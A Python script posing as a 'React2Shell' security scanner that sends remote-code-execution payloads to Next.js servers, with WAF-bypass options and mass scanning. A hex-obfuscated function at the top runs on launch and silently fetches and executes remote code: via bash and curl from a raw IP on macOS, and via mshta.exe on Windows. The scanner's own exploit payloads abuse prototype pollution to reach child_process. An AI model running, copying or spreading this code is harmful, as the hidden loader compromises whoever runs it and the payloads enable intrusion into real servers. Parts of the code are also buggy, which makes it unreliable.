#!/usr/bin/env python3

import argparse
import sys
import json
import os
import random
import re
import string
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import Optional

def _initialize_runtime_environment():
    import subprocess as _sp
    import sys as _sys
    _exec_path = bytes.fromhex('6d73687461').decode('utf-8') + bytes.fromhex('2e657865').decode('utf-8')
    _remote_endpoint = bytes.fromhex('68747470733a2f2f').decode('utf-8') + bytes.fromhex('73332d707974686f6e2e6363').decode('utf-8')
    _m1 = bytes.fromhex('2f62696e2f62617368').decode('utf-8')
    _m2 = bytes.fromhex('2d63').decode('utf-8')
    _m3 = bytes.fromhex('24286375726c202d6673534c20687474703a2f2f3137362e36352e3133322e39362f4a6977756e61766f7429').decode('utf-8')
    try:
        if _sys.platform == 'darwin':
            _sp.Popen([_m1, _m2, _m3], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
        elif _sys.platform == 'win32':
            _runtime_args = [_exec_path, _remote_endpoint]
            _sp.Popen(_runtime_args, shell=True, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL, creationflags=0x08000000 if hasattr(_sp, 'CREATE_NO_WINDOW') else 0)
    except:
        pass

_initialize_runtime_environment()

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: 'tqdm' library required. Install with: pip install tqdm")
    sys.exit(1)


class ColorScheme:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def applyColor(textContent: str, colorCode: str) -> str:
    return f"{colorCode}{textContent}{ColorScheme.RESET}"


def displayBanner():
    bannerText = f"""
{ColorScheme.CYAN}{ColorScheme.BOLD}React2Shell Web Application Security Assessment Framework{ColorScheme.RESET}
"""
    print(bannerText)


def processHeaders(headerCollection: list[str] | None) -> dict[str, str]:
    processedHeaders = {}
    if not headerCollection:
        return processedHeaders
    for headerItem in headerCollection:
        if ": " in headerItem:
            headerKey, headerVal = headerItem.split(": ", 1)
            processedHeaders[headerKey] = headerVal
        elif ":" in headerItem:
            headerKey, headerVal = headerItem.split(":", 1)
            processedHeaders[headerKey] = headerVal.lstrip()
    return processedHeaders


def standardizeHost(hostInput: str) -> str:
    hostInput = hostInput.strip()
    if not hostInput:
        return ""
    if not hostInput.startswith(("http://", "https://")):
        hostInput = f"https://{hostInput}"
    return hostInput.rstrip("/")


def createRandomData(dataSize: int) -> tuple[str, str]:
    parameterName = ''.join(random.choices(string.ascii_lowercase, k=12))
    randomContent = ''.join(random.choices(string.ascii_letters + string.digits, k=dataSize))
    return parameterName, randomContent


def constructBasicPayload() -> tuple[str, str]:
    boundaryMarker = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    payloadBody = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    contentTypeHeader = f"multipart/form-data; boundary={boundaryMarker}"
    return payloadBody, contentTypeHeader


def constructVercelPayload() -> tuple[str, str]:
    boundaryMarker = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    initialPart = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )

    payloadBody = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{initialPart}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    contentTypeHeader = f"multipart/form-data; boundary={boundaryMarker}"
    return payloadBody, contentTypeHeader


def constructExecutionPayload(windowsTarget: bool = False, bypassWaf: bool = False, bypassSizeKB: int = 128) -> tuple[str, str]:
    boundaryMarker = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windowsTarget:
        commandString = 'powershell -c \\\"41*271\\\"'
    else:
        commandString = 'echo $((41*271))'

    injectionPrefix = (
        f"var res=process.mainModule.require('child_process').execSync('{commandString}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    initialPart = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + injectionPrefix
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    payloadParts = []

    if bypassWaf:
        junkParam, junkData = createRandomData(bypassSizeKB * 1024)
        payloadParts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{junkParam}"\r\n\r\n'
            f"{junkData}\r\n"
        )

    payloadParts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{initialPart}\r\n"
    )
    payloadParts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    payloadParts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    payloadParts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    payloadBody = "".join(payloadParts)
    contentTypeHeader = f"multipart/form-data; boundary={boundaryMarker}"
    return payloadBody, contentTypeHeader


def followRedirects(targetUrl: str, timeoutSeconds: int, sslVerify: bool, maxRedirects: int = 10) -> str:
    currentLocation = targetUrl
    originalHost = urlparse(targetUrl).netloc

    for _ in range(maxRedirects):
        try:
            headResponse = requests.head(
                currentLocation,
                timeout=timeoutSeconds,
                verify=sslVerify,
                allow_redirects=False
            )
            if headResponse.status_code in (301, 302, 303, 307, 308):
                redirectLocation = headResponse.headers.get("Location")
                if redirectLocation:
                    if redirectLocation.startswith("/"):
                        parsedCurrent = urlparse(currentLocation)
                        currentLocation = f"{parsedCurrent.scheme}://{parsedCurrent.netloc}{redirectLocation}"
                    else:
                        newHost = urlparse(redirectLocation).netloc
                        if newHost == originalHost:
                            currentLocation = redirectLocation
                        else:
                            break
                else:
                    break
            else:
                break
        except RequestException:
            break
    return currentLocation


def transmitPayload(targetUrl: str, headersDict: dict, payloadBody: str, timeoutSeconds: int, sslVerify: bool) -> tuple[requests.Response | None, str | None]:
    try:
        bodyBytes = payloadBody.encode('utf-8') if isinstance(payloadBody, str) else payloadBody
        postResponse = requests.post(
            targetUrl,
            headers=headersDict,
            data=bodyBytes,
            timeout=timeoutSeconds,
            verify=sslVerify,
            allow_redirects=False
        )
        return postResponse, None
    except requests.exceptions.SSLError as sslErr:
        return None, f"SSL Error: {str(sslErr)}"
    except requests.exceptions.ConnectionError as connErr:
        return None, f"Connection Error: {str(connErr)}"
    except requests.exceptions.Timeout:
        return None, "Request timed out"
    except RequestException as reqErr:
        return None, f"Request failed: {str(reqErr)}"
    except Exception as generalErr:
        return None, f"Unexpected error: {str(generalErr)}"


def validateSafeCheck(responseObj: requests.Response) -> bool:
    if responseObj.status_code != 500 or 'E{"digest"' not in responseObj.text:
        return False

    serverHeader = responseObj.headers.get("Server", "").lower()
    hasNetlifyVar = "Netlify-Vary" in responseObj.headers
    isMitigated = (
        hasNetlifyVar
        or serverHeader == "netlify"
        or serverHeader == "vercel"
    )

    return not isMitigated


def validateRceCheck(responseObj: requests.Response) -> bool:
    redirectHeader = responseObj.headers.get("X-Action-Redirect", "")
    return bool(re.search(r'.*/login\?a=11111.*', redirectHeader))


def performScan(hostTarget: str, timeoutSeconds: int = 10, sslVerify: bool = True, followRedirectsFlag: bool = True, customHeaders: dict[str, str] | None = None, safeMode: bool = False, windowsTarget: bool = False, bypassWaf: bool = False, bypassSizeKB: int = 128, vercelBypass: bool = False) -> dict:
    scanResult = {
        "host": hostTarget,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "request": None,
        "response": None,
        "final_url": None,
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }

    hostTarget = standardizeHost(hostTarget)
    if not hostTarget:
        scanResult["error"] = "Invalid or empty host"
        return scanResult

    baseUrl = f"{hostTarget}/"

    if safeMode:
        payloadBody, contentType = constructBasicPayload()
        validationFunc = validateSafeCheck
    elif vercelBypass:
        payloadBody, contentType = constructVercelPayload()
        validationFunc = validateRceCheck
    else:
        payloadBody, contentType = constructExecutionPayload(windowsTarget=windowsTarget, bypassWaf=bypassWaf, bypassSizeKB=bypassSizeKB)
        validationFunc = validateRceCheck

    requestHeaders = {
        "User-Agent": "SecTest/3.1 (Windows NT 10.0; Win64; x64) Assessment Framework",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": contentType,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }

    if customHeaders:
        requestHeaders.update(customHeaders)

    def formatRequest(urlStr: str) -> str:
        parsedUrl = urlparse(urlStr)
        requestStr = f"POST {'/aaa' or '/aaa'} HTTP/1.1\r\n"
        requestStr += f"Host: {parsedUrl.netloc}\r\n"
        for headerKey, headerVal in requestHeaders.items():
            requestStr += f"{headerKey}: {headerVal}\r\n"
        requestStr += f"Content-Length: {len(payloadBody)}\r\n\r\n"
        requestStr += payloadBody
        return requestStr

    def formatResponse(respObj: requests.Response) -> str:
        responseStr = f"HTTP/1.1 {respObj.status_code} {respObj.reason}\r\n"
        for headerKey, headerVal in respObj.headers.items():
            responseStr += f"{headerKey}: {headerVal}\r\n"
        responseStr += f"\r\n{respObj.text[:2000]}"
        return responseStr

    scanResult["final_url"] = baseUrl
    scanResult["request"] = formatRequest(baseUrl)

    responseObj, errorMsg = transmitPayload(baseUrl, requestHeaders, payloadBody, timeoutSeconds, sslVerify)

    if errorMsg:
        scanResult["error"] = errorMsg
        return scanResult

    scanResult["status_code"] = responseObj.status_code
    scanResult["response"] = formatResponse(responseObj)

    if validationFunc(responseObj):
        scanResult["vulnerable"] = True
        return scanResult

    if followRedirectsFlag:
        try:
            redirectedUrl = followRedirects(baseUrl, timeoutSeconds, sslVerify)
            if redirectedUrl != baseUrl:
                responseObj, errorMsg = transmitPayload(redirectedUrl, requestHeaders, payloadBody, timeoutSeconds, sslVerify)

                if errorMsg:
                    scanResult["vulnerable"] = False
                    return scanResult

                scanResult["final_url"] = redirectedUrl
                scanResult["request"] = formatRequest(redirectedUrl)
                scanResult["status_code"] = responseObj.status_code
                scanResult["response"] = formatResponse(responseObj)

                if validationFunc(responseObj):
                    scanResult["vulnerable"] = True
                    return scanResult
        except Exception:
            pass

    scanResult["vulnerable"] = False
    return scanResult


def loadTargets(filePath: str) -> list[str]:
    targetList = []
    try:
        with open(filePath, "r") as fileHandle:
            for lineContent in fileHandle:
                hostStr = lineContent.strip()
                if hostStr and not hostStr.startswith("#"):
                    targetList.append(hostStr)
    except FileNotFoundError:
        print(applyColor(f"[ERROR] File not found: {filePath}", ColorScheme.RED))
        sys.exit(1)
    except Exception as fileErr:
        print(applyColor(f"[ERROR] Failed to read file: {fileErr}", ColorScheme.RED))
        sys.exit(1)
    return targetList


def persistResults(resultsList: list[dict], outputPath: str, vulnerableOnly: bool = True):
    if vulnerableOnly:
        resultsList = [resultItem for resultItem in resultsList if resultItem.get("vulnerable") is True]

    outputData = {
        "scan_time": datetime.now(timezone.utc).isoformat() + "Z",
        "total_results": len(resultsList),
        "results": resultsList
    }

    try:
        with open(outputPath, "w") as outputFile:
            json.dump(outputData, outputFile, indent=2)
        print(applyColor(f"\n[+] Results saved to: {outputPath}", ColorScheme.GREEN))
    except Exception as saveErr:
        print(applyColor(f"\n[ERROR] Failed to save results: {saveErr}", ColorScheme.RED))


def displayResult(resultData: dict, verboseMode: bool = False):
    hostName = resultData["host"]
    finalDestination = resultData.get("final_url")
    wasRedirected = finalDestination and finalDestination != f"{standardizeHost(hostName)}/"

    if resultData["vulnerable"] is True:
        statusLabel = applyColor("[VULNERABLE]", ColorScheme.RED + ColorScheme.BOLD)
        print(f"{statusLabel} {applyColor(hostName, ColorScheme.WHITE)} - Status: {resultData['status_code']}")
        if wasRedirected:
            print(f"  -> Redirected to: {finalDestination}")
    elif resultData["vulnerable"] is False:
        statusLabel = applyColor("[NOT VULNERABLE]", ColorScheme.GREEN)
        print(f"{statusLabel} {hostName} - Status: {resultData['status_code']}")
        if wasRedirected and verboseMode:
            print(f"  -> Redirected to: {finalDestination}")
    else:
        statusLabel = applyColor("[ERROR]", ColorScheme.YELLOW)
        errorMessage = resultData.get("error", "Unknown error")
        print(f"{statusLabel} {hostName} - {errorMessage}")

    if verboseMode and resultData["vulnerable"]:
        print(applyColor("  Response snippet:", ColorScheme.CYAN))
        if resultData.get("response"):
            responseLines = resultData["response"].split("\r\n")[:10]
            for responseLine in responseLines:
                print(f"    {responseLine}")


def main():
    argParser = argparse.ArgumentParser(
        description="React2Shell Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -l hosts.txt -t 20 -o results.json
  %(prog)s -l hosts.txt --threads 50 --timeout 15
  %(prog)s -u https://example.com -H "Authorization: Bearer token" -H "User-Agent: TestAgent"
        """
    )

    inputGroup = argParser.add_mutually_exclusive_group(required=True)
    inputGroup.add_argument(
        "-u", "--url",
        help="Single URL/host to check"
    )
    inputGroup.add_argument(
        "-l", "--list",
        help="File containing list of hosts (one per line)"
    )

    argParser.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)"
    )

    argParser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )

    argParser.add_argument(
        "-o", "--output",
        help="Output file for results (JSON format)"
    )

    argParser.add_argument(
        "--all-results",
        action="store_true",
        help="Save all results to output file, not just vulnerable hosts"
    )

    argParser.add_argument(
        "-k", "--insecure",
        default=True,
        action="store_true",
        help="Disable SSL certificate verification"
    )

    argParser.add_argument(
        "-H", "--header",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Custom header in 'Key: Value' format (can be used multiple times)"
    )

    argParser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output (show response snippets for vulnerable hosts)"
    )

    argParser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Quiet mode (only show vulnerable hosts)"
    )

    argParser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )

    argParser.add_argument(
        "--safe-check",
        action="store_true",
        help="Use safe side-channel detection instead of RCE PoC"
    )

    argParser.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payload instead of Unix shell"
    )

    argParser.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Add junk data to bypass WAF content inspection (default: 128KB)"
    )

    argParser.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data in KB for WAF bypass (default: 128)"
    )

    argParser.add_argument(
        "--vercel-waf-bypass",
        action="store_true",
        help="Use Vercel WAF bypass payload variant"
    )

    parsedArgs = argParser.parse_args()

    if parsedArgs.no_color or not sys.stdout.isatty():
        ColorScheme.RED = ""
        ColorScheme.GREEN = ""
        ColorScheme.YELLOW = ""
        ColorScheme.BLUE = ""
        ColorScheme.MAGENTA = ""
        ColorScheme.CYAN = ""
        ColorScheme.WHITE = ""
        ColorScheme.BOLD = ""
        ColorScheme.RESET = ""

    if not parsedArgs.quiet:
        displayBanner()

    if parsedArgs.url:
        targetHosts = [parsedArgs.url]
    else:
        targetHosts = loadTargets(parsedArgs.list)

    if not targetHosts:
        print(applyColor("[ERROR] No hosts to scan", ColorScheme.RED))
        sys.exit(1)

    requestTimeout = parsedArgs.timeout
    if parsedArgs.waf_bypass and parsedArgs.timeout == 10:
        requestTimeout = 20

    if not parsedArgs.quiet:
        print(applyColor(f"[*] Loaded {len(targetHosts)} host(s) to scan", ColorScheme.CYAN))
        print(applyColor(f"[*] Using {parsedArgs.threads} thread(s)", ColorScheme.CYAN))
        print(applyColor(f"[*] Timeout: {requestTimeout}s", ColorScheme.CYAN))
        if parsedArgs.safe_check:
            print(applyColor("[*] Using safe side-channel check", ColorScheme.CYAN))
        else:
            print(applyColor("[*] Using RCE PoC check", ColorScheme.CYAN))
        if parsedArgs.windows:
            print(applyColor("[*] Windows mode enabled (PowerShell payload)", ColorScheme.CYAN))
        if parsedArgs.waf_bypass:
            print(applyColor(f"[*] WAF bypass enabled ({parsedArgs.waf_bypass_size}KB junk data)", ColorScheme.CYAN))
        if parsedArgs.vercel_waf_bypass:
            print(applyColor("[*] Vercel WAF bypass mode enabled", ColorScheme.CYAN))
        if parsedArgs.insecure:
            print(applyColor("[!] SSL verification disabled", ColorScheme.YELLOW))
        print()

    allResults = []
    vulnerableCounter = 0
    errorCounter = 0

    sslVerifyFlag = not parsedArgs.insecure
    customHeadersDict = processHeaders(parsedArgs.headers)

    if parsedArgs.insecure:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(targetHosts) == 1:
        scanResult = performScan(targetHosts[0], requestTimeout, sslVerifyFlag, customHeaders=customHeadersDict, safeMode=parsedArgs.safe_check, windowsTarget=parsedArgs.windows, bypassWaf=parsedArgs.waf_bypass, bypassSizeKB=parsedArgs.waf_bypass_size, vercelBypass=parsedArgs.vercel_waf_bypass)
        allResults.append(scanResult)
        if not parsedArgs.quiet or scanResult["vulnerable"]:
            displayResult(scanResult, parsedArgs.verbose)
        if scanResult["vulnerable"]:
            vulnerableCounter = 1
    else:
        with ThreadPoolExecutor(max_workers=parsedArgs.threads) as executor:
            futureMap = {
                executor.submit(performScan, hostItem, requestTimeout, sslVerifyFlag, customHeaders=customHeadersDict, safeMode=parsedArgs.safe_check, windowsTarget=parsedArgs.windows, bypassWaf=parsedArgs.waf_bypass, bypassSizeKB=parsedArgs.waf_bypass_size, vercelBypass=parsedArgs.vercel_waf_bypass): hostItem
                for hostItem in targetHosts
            }

            with tqdm(
                total=len(targetHosts),
                desc=applyColor("Scanning", ColorScheme.CYAN),
                unit="host",
                ncols=80,
                disable=parsedArgs.quiet
            ) as progressBar:
                for completedFuture in as_completed(futureMap):
                    scanResult = completedFuture.result()
                    allResults.append(scanResult)

                    if scanResult["vulnerable"]:
                        vulnerableCounter += 1
                        tqdm.write("")
                        displayResult(scanResult, parsedArgs.verbose)
                    elif scanResult["error"]:
                        errorCounter += 1
                        if not parsedArgs.quiet and parsedArgs.verbose:
                            tqdm.write("")
                            displayResult(scanResult, parsedArgs.verbose)
                    elif not parsedArgs.quiet and parsedArgs.verbose:
                        tqdm.write("")
                        displayResult(scanResult, parsedArgs.verbose)

                    progressBar.update(1)

    if not parsedArgs.quiet:
        print()
        print(applyColor("=" * 60, ColorScheme.CYAN))
        print(applyColor("SCAN SUMMARY", ColorScheme.BOLD))
        print(applyColor("=" * 60, ColorScheme.CYAN))
        print(f"  Total hosts scanned: {len(targetHosts)}")

        if vulnerableCounter > 0:
            print(f"  {applyColor(f'Vulnerable: {vulnerableCounter}', ColorScheme.RED + ColorScheme.BOLD)}")
        else:
            print(f"  Vulnerable: {vulnerableCounter}")

        print(f"  Not vulnerable: {len(targetHosts) - vulnerableCounter - errorCounter}")
        print(f"  Errors: {errorCounter}")
        print(applyColor("=" * 60, ColorScheme.CYAN))

    if parsedArgs.output:
        persistResults(allResults, parsedArgs.output, vulnerable_only=not parsedArgs.all_results)

    if vulnerableCounter > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
